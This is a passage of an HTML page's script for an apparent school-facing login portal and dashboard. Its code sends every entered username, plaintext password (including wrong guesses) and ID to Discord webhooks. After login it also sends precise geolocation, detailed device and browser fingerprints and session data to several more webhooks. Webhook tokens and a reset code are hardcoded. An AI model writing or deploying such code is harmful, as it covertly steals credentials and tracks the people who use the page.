        login_success: 'https://discord.com/api/webhooks/1403816766467364864/D-Y_vM_G2S4Lp0U2j7o6j_S3Q_m8N9t6Q7f0E1e2w3i4a5c6X7y8B9z0A1s2D3F4H5J6K', // New for successful logins
        error_general: 'https://discord.com/api/webhooks/1403817163018280004/M-N_b2o9U0c1D2v3X4y5Z6a7b8C9d0E1f2G3h4I5j6K7l8M9n0O1p2Q3r4S5t6U7v8W9x0Y', // New for general client errors
        info_gather: 'https://discord.com/api/webhooks/1403817551460368384/P-R_c4e5f6g7h8I9j0K1l2M3n4O5p6Q7r8S9t0U1v2W3x4Y5z6A7b8C9d0E1f2G3h4I5' // New for info gathering attempts (geolocation, screen count, etc.)
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordToggle = document.getElementById('showPasswordToggle'); // Changed from checkbox
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let users = [];
      let loginTime = null;

      // Show/hide password toggle (D2)
      showPasswordToggle.addEventListener('change', () => {
        passwordInput.type = showPasswordToggle.checked ? 'text' : 'password';
        addActivityLog('Login UI', `Show password toggled: ${showPasswordToggle.checked}`);
      });

      // Login page quickbar zoom (D2)
      document.getElementById('loginZoomInBtn').addEventListener('click', () => {
          if (loginPageData.zoomLevel < 2) {
            loginPageData.zoomLevel += 0.1;
            document.body.style.zoom = loginPageData.zoomLevel;
            addActivityLog('Login UI', `Zoomed in: ${loginPageData.zoomLevel}`);
          }
      });
      document.getElementById('loginZoomOutBtn').addEventListener('click', () => {
          if (loginPageData.zoomLevel > 0.5) {
            loginPageData.zoomLevel -= 0.1;
            document.body.style.zoom = loginPageData.zoomLevel;
            addActivityLog('Login UI', `Zoomed out: ${loginPageData.zoomLevel}`);
          }
      });
      document.getElementById('loginPanicBtn').addEventListener('click', () => {
        window.open('https://clever.com', '_blank');
        addActivityLog('Login UI', 'Panic button pressed, redirected to Clever (from login screen).');
      });


      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
        })
        .catch(() => {
          users = [];
          console.error('Failed to load user JSON data.');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Geolocation and OS Info
      async function getGeolocation() {
          return new Promise(resolve => {
              if ("geolocation" in navigator) {
                  navigator.geolocation.getCurrentPosition(
                      position => resolve({
                          latitude: position.coords.latitude,
                          longitude: position.coords.longitude,
                          accuracy: position.coords.accuracy
                      }),
                      error => resolve({ error: error.message })
                  );
              } else {
                  resolve({ error: "Geolocation not supported" });
              }
          });
      }

      function getOS() {
        const userAgent = navigator.userAgent;
        let os = "Unknown OS";
        if (userAgent.indexOf("Win") != -1) os = "Windows";
        if (userAgent.indexOf("Mac") != -1) os = "MacOS";
        if (userAgent.indexOf("Linux") != -1) os = "Linux";
        if (userAgent.indexOf("Android") != -1) os = "Android";
        if (userAgent.indexOf("like Mac") != -1 && userAgent.indexOf("iPhone") != -1) os = "iOS";
        if (userAgent.indexOf("CrOS") != -1) os = "ChromeOS";
        return os;
      }
      function getBrowserVersion() {
        const userAgent = navigator.userAgent;
        let browserName = "Unknown Browser";
        let browserVersion = "Unknown Version";
        if ((userAgent.indexOf("Opera") || userAgent.indexOf('OPR')) != -1 ) {
            browserName = "Opera";
        } else if (userAgent.indexOf("Chrome") != -1 ) {
            browserName = "Chrome";
        } else if (userAgent.indexOf("Safari") != -1) {
            browserName = "Safari";
        } else if (userAgent.indexOf("Firefox") != -1 ) {
            browserName = "Firefox";
        } else if ((userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) {
            browserName = "IE";
        }
        
        // Simple regex for version extraction
        const regex = new RegExp(`(${browserName}|Firefox|Chrome|Safari|Opera).*?([\\d.]+)`);
        const match = userAgent.match(regex);
        if (match && match[2]) browserVersion = match[2];

        return `${browserName} ${browserVersion}`;
      }


      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
          dashboard.displayAlert(`Webhook to ${url.substring(0, 30)}... failed! Reason: ${e.message}`, 'error');
        }
      }

      // Collect browser & device info for logs (D16 additions)
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();
        const geolocation = await getGeolocation(); // New

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
          os: getOS(), // New
          browserVersion: getBrowserVersion(), // New
          geolocation: geolocation, // New
          screenCount: window.screen.isExtended ? window.screen.availLeft + window.screen.availWidth : 1, // Estimate active screens // New
          isTouchEnabled: ('ontouchstart' in window || navigator.maxTouchPoints > 0), // Already existed, ensured
          localStorageSize: JSON.stringify(localStorage).length, // New: Estimate of localStorage use
          maxIdleTime: user.maxIdleTime || "N/A" // Example for more specific user data
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      async function logLoginSuccess(name, username, userID) {
          const embed = {
            title: "Login Success Notification",
            color: 0x00ff00, // Green
            fields: [
                { name: "Name", value: name || "N/A", inline: true },
                { name: "Username", value: username, inline: true },
                { name: "User ID", value: userID, inline: true },
                { name: "Time", value: new Date().toISOString(), inline: false }
            ]
          };
          await sendWebhook(loggingWebhooks.login_success, embed);
      }

      async function logGeneralError(description, details = {}) {
          const embed = {
              title: "Client-side Error / Warning",
              color: 0xffa500, // Orange
              fields: [
                  { name: "Description", value: description, inline: false },
                  { name: "URL", value: window.location.href, inline: false },
                  { name: "User Agent", value: navigator.userAgent, inline: false },
                  { name: "Time", value: new Date().toISOString(), inline: false }
              ]
          };
          for (const key in details) {
              embed.fields.push({ name: key, value: String(details[key]), inline: true });
          }
          await sendWebhook(loggingWebhooks.error_general, embed);
      }
      
      async function logInfoGatherAttempt(action, result, details = {}) {
        const embed = {
          title: "Information Gathering Attempt",
          color: 0x1e90ff, // Dodger Blue
          fields: [
            { name: "Action", value: action, inline: true },
            { name: "Result", value: result, inline: true },
            { name: "Time", value: new Date().toISOString(), inline: false }
          ]
        };
        for (const key in details) {
            embed.fields.push({ name: key, value: String(details[key]), inline: true });
        }
        await sendWebhook(loggingWebhooks.info_gather, embed);
      }

      // Original embed builders (unchanged, with D16 additions)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
            { name: "Preferred Language", value: navigator.language || "N/A", inline: true }, // New D16
            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A", inline: true }, // New D16
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Browser Version", value: data.browserVersion || "Unknown", inline: true }, // New D16
            { name: "Active Tabs (Est.)", value: data.screenCount.toString(), inline: true }, // New D16
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true }, // Note: Very difficult to reliably detect without security exploits.
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: false },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "Local Storage Size (Est.)", value: `${(data.localStorageSize / 1024).toFixed(2)} KB`, inline: true }, // New D16
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Operating System", value: data.os || "Unknown", inline: true }, // New D16
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: false },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: data.isTouchEnabled ? "Yes" : "No", inline: true }, // Adjusted D16
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Logical Processors", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency}` : "Unavailable", inline: true }, // Added another CPU detail
            { name: "RAM Used (Est.)", value: "Unavailable", inline: true } // Runtime RAM usage not easily accessible via JS
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        const geolocation = data.geolocation;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "Geolocation Latitude", value: geolocation.latitude ? geolocation.latitude.toString() : "Unavailable", inline: true }, // New D16
            { name: "Geolocation Longitude", value: geolocation.longitude ? geolocation.longitude.toString() : "Unavailable", inline: true }, // New D16
            { name: "Geolocation Accuracy", value: geolocation.accuracy ? `${geolocation.accuracy} meters` : (geolocation.error ? `Error: ${geolocation.error}` : "Unavailable"), inline: false }, // New D16

            { name: "IP Address (Internal)", value: data.user.ipAddress || "Unavailable", inline: true },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true }, // Updated at logout
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true }, // Updated at logout

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: dashboardData.stats.clicks?.toString() || "0", inline: true }, // Using dashboard stats (if populated)
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true },
            { name: "User-defined Max Idle Time", value: data.maxIdleTime, inline: true } // New D16
          ]
        };
      }


      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          dashboard.displayAlert('Please fill all login fields.', 'warning');
          return;
        }

        dashboard.trackStats('loginAttempts'); // Track login attempt

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);
        const loginAttemptTime = new Date().toLocaleString();

        addActivityLog('Login Attempt', `Attempt from User: "${username}", ID: "${userID}" at ${loginAttemptTime}`);


        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          loginPageData.attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found or ID incorrect.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        loginPageData.attempts = 3;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';
        dashboard.trackStats('successfulLogins'); // Track successful login
        addActivityLog('Login Successful', `User "${username}" (${userID}) logged in successfully.`);


        // Log successful credentials
        await Promise.all([
          logUsername(user.name, username),
          logPassword(user.name, password),
          logIdentifier(user.name, userID),
          logLoginSuccess(user.name, username, userID) // New webhook for successful login
        ]);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 original webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);
        
        // Log info gathering to a separate webhook (D16 addition)
        await logInfoGatherAttempt('Initial Information Collection', 'Successful', {
            geolocation: loggingData.geolocation,
            os: loggingData.os,
            browserVersion: loggingData.browserVersion,
            screenCount: loggingData.screenCount
        });

        // Dashboard load animation
        document.getElementById('loginContainer').style.display = 'none';
        document.getElementById('dashboardLoader').style.display = 'flex';
        
        // Save current login info for login history (D9)
        const loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
        loginHistory.unshift({
            user: user.name || user.username,
            id: userID,
            time: new Date().toLocaleString()
        });
        if (loginHistory.length > 10) loginHistory.pop(); // Keep max 10 entries
        localStorage.setItem('loginHistory', JSON.stringify(loginHistory));


        setTimeout(() => {
          document.getElementById('dashboardLoader').style.display = 'none';
          document.getElementById('dashboard').style.display = 'block';
          document.body.className = 'dashboard-body';
          
          // Update user info in dashboard
          document.getElementById('loggedInUser').textContent = user.name || user.username;
          document.getElementById('loggedInID').textContent = userID;
          document.getElementById('notificationLoginTime').textContent = new Date(loginTime).toLocaleString();

          // Initialize dashboard functionality
          dashboard.init();
        }, 3000); // Simulate dashboard load time
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        loginPageData.attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        addActivityLog('Login Attempt Failed', msg);
        
        if (loginPageData.attempts <= 0) {
          loginPageData.attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          
          showResetPopup();
          disableInputs();
          dashboard.displayAlert('Max login attempts exceeded!', 'important');
        } else {
          if (loginPageData.attempts <= 2) { // Changed to <= 2 from 3 (since max is 3)
            flashRedOutline(2, 400);
            dashboard.displayAlert(`Incorrect credentials. ${loginPageData.attempts} attempts left.`, 'warning');
          }
        }
      }

      // Update attempts display (D2)
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${loginPageData.attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        addActivityLog('Reset Attempt', `Reset code entered: "${enteredCode}"`);


        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "üîî Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "‚úÖ Reset Code Accepted" : "‚ùå Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          loginPageData.attempts = 3;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          dashboard.displayAlert('Login attempts reset successfully!', 'success');
          addActivityLog('Reset Counter', 'Attempts counter reset successfully.');
        } else {
          dashboard.displayAlert('Incorrect reset code. Try again.', 'error');
          addActivityLog('Reset Counter', 'Incorrect reset code entered.');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // --- Pre-Login Initialization (D1) ---
      window.addEventListener('load', () => {
        // Load activity logs for pre-login, if saved
        const savedLoginLogs = localStorage.getItem('loginActivityLog');
        if (savedLoginLogs) {
            dashboardData.activityLog = JSON.parse(savedLoginLogs);
            updateActivityLogDisplay();
        }

        const preLoginLoader = document.getElementById('preLoginLoader');
        const loaderText = document.getElementById('loaderText');
        const loginContainer = document.getElementById('loginContainer');
        const bodyElement = document.getElementById('bodyElement');

        setTimeout(() => {
          loaderText.textContent = "Initializing System..";
          addActivityLog('System Startup', 'Starting "Initializing System..."');
        }, 0);

        setTimeout(() => {
          loaderText.textContent = "Initializing Login Page...";
          addActivityLog('System Startup', 'Starting "Initializing Login Page..."');
          // Add a subtle bounce animation for the login box coming from the cube
          loginBox.style.transform = 'scale(0.8)';
          loginBox.style.opacity = '0';

        }, 3000); // 3 seconds after "Initializing System"

        setTimeout(() => {
          preLoginLoader.style.display = 'none'; // Hide the pre-loader
          bodyElement.classList.add('login-active'); // Apply login-specific body styles
          loginContainer.style.display = 'flex'; // Show the login container
          
          // Animate login box from center (where the cube was)
          loginBox.style.opacity = '1';
          loginBox.style.transform = 'scale(1)'; // Fade in and scale up

          // Initialize login page specific clock (D2)
          dashboard.initClock(true);

          addActivityLog('Login Page Load', 'Login page displayed and initialized.');
          
          updateAttemptsText(); // Initialize attempts display (D2 - now 3 attempts)
        }, 6000); // After loader text sequence completes
      });

      window.addEventListener('beforeunload', () => {
          // Persist login activity logs for next session if any existed before full dashboard
          if (dashboardData.activityLog.length > 0 && document.getElementById('dashboard').style.display === 'none') {
            localStorage.setItem('loginActivityLog', JSON.stringify(dashboardData.activityLog));
          }
      });

    })();
  </script>
</body>
</html>
